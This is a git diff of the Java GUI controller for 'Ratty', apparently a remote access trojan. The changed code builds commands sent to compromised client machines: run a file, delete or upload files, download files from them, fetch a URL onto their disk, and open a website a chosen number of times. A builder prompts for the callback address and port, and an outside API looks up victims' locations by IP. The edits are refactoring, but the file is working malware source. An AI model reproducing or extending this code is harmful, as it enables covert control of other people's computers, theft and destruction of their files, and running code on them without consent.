@@ -78,6 +78,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	private static final String BUILDER_ADDRESS_QUESTION = LANGUAGE.getString("builder.address_question");
 	private static final String BUILDER_PORT_QUESTION = LANGUAGE.getString("builder.port_question");
 	private static final String URL_MESSAGE = LANGUAGE.getString("server.url_message");
+	private static final String AMOUNT_QUESTION = LANGUAGE.getString("server.amount_question");
 	
 	private static final String FLAG_ADDRESS = "http://www.geojoe.co.uk/api/flag/?ip=";
 	
@@ -123,13 +124,22 @@ public final class RattyGuiController extends AbstractRattyController implements
 	private WebsitePacket createWebsitePacket() {
 		final String input = gui.getInput(URL_MESSAGE);
 		
-		if (input != null) {
-			final WebsitePacket packet = new WebsitePacket(input);
-			
-			return packet;
+		if (input == null) {
+			return null;
 		}
 		
-		return null;
+		final String numberInput = gui.getInput(AMOUNT_QUESTION);
+		final int number;
+		
+		try {
+			number = Integer.parseInt(numberInput);
+		} catch (final NumberFormatException ex) {
+			return null;
+		}
+		
+		final WebsitePacket packet = new WebsitePacket(input, number);
+		
+		return packet;
 	}
 	
 	private AudioPacket createAudioPacket() {
@@ -140,7 +150,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private DownloadFilePacket createDownloadPacket(final ServerClient client) {
-		final FileTreeNode node = client.fileTree.getLastNodeClicked();
+		final FileTreeNode node = client.fileTree.getClickedNode();
 		final String path = node.getPath();
 		final DownloadFilePacket packet = new DownloadFilePacket(path);
 		
@@ -151,7 +161,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 		final File file = gui.getFile();
 		
 		if (file != null) {
-			final FileTreeNode node = client.fileTree.getLastNodeClicked();
+			final FileTreeNode node = client.fileTree.getClickedNode();
 			final String path = node.getPath();
 			final UploadFilePacket packet = new UploadFilePacket(file, path);
 			
@@ -162,7 +172,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private ExecuteFilePacket createExecutePacket(final ServerClient client) {
-		final FileTreeNode node = client.fileTree.getLastNodeClicked();
+		final FileTreeNode node = client.fileTree.getClickedNode();
 		final String path = node.getPath();
 		final ExecuteFilePacket packet = new ExecuteFilePacket(path);
 		
@@ -170,7 +180,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private DeleteFilePacket createDeletePacket(final ServerClient client) {
-		final FileTreeNode node = client.fileTree.getLastNodeClicked();
+		final FileTreeNode node = client.fileTree.getClickedNode();
 		final String path = node.getPath();
 		final DeleteFilePacket packet = new DeleteFilePacket(path);
 		
@@ -181,7 +191,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 		final String input = gui.getInput();
 		
 		if (input != null) {
-			final FileTreeNode node = client.fileTree.getLastNodeClicked();
+			final FileTreeNode node = client.fileTree.getClickedNode();
 			final String path = node.getPath();
 			final CreateDirectoryPacket packet = new CreateDirectoryPacket(path, input);
 			
@@ -207,7 +217,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 		final String address = gui.getInput(URL_MESSAGE);
 		
 		if (address != null) {
-			final FileTreeNode node = client.fileTree.getLastNodeClicked();
+			final FileTreeNode node = client.fileTree.getClickedNode();
 			final String path = node.getPath();
 			final DownloadUrlPacket packet = new DownloadUrlPacket(address, path);
 			
@@ -261,7 +271,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private void requestFile(final ServerClient client) {
-		final FileTreeNode node = client.fileTree.getLastNodeClicked();
+		final FileTreeNode node = client.fileTree.getClickedNode();
 		final String path = node.getPath();
 		final FileRequestPacket packet = new FileRequestPacket(path);
 		
@@ -561,8 +571,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	@Override
-	public void userInput(final String command) {
-		final ServerClient client = gui.getLastServerClientClicked();
+	public void userInput(final String command, final ServerClient client) {
 		final IPacket packet = createPacket(client, command);
 		
 		if (packet != null) {
